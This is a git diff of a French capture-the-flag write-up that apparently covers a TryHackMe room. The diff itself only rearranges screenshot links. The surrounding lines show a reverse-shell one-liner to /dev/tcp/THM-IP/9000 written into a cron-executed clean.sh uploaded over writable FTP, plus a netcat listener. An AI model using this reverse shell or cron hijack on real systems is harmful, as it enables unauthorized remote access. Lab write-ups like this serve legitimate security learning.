@@ -45,7 +45,6 @@ Nous avons remarqué que nous avons les droits d'écriture sur le serveur FTP da
 #!/bin/bash
 bash -i >& /dev/tcp/THM-IP/9000 <&1
 ```
-![FTP Login et Listing](screenshots/2eme.webp)
 
 Nous uploadons ce fichier sur le serveur FTP pour écraser l'ancien :
 
@@ -57,7 +56,8 @@ Nous ouvrons un listener Netcat sur notre machine pour attendre la connexion :
 nc -lvnp 9000
 ```
 Lorsque le Cron Job s'exécute (selon son intervalle planifié), il lance notre script clean.sh. Nous obtenons alors un shell en tant qu'utilisateur local.
-![FTP Login et Listing](screenshots/3eme.webp)
+
+![FTP Login et Listing](screenshots/2eme.webp)
 
 ## 👑 3. Escalade de Privilèges : User vers Root
 *(Technique : SUID Binary Exploitation)*
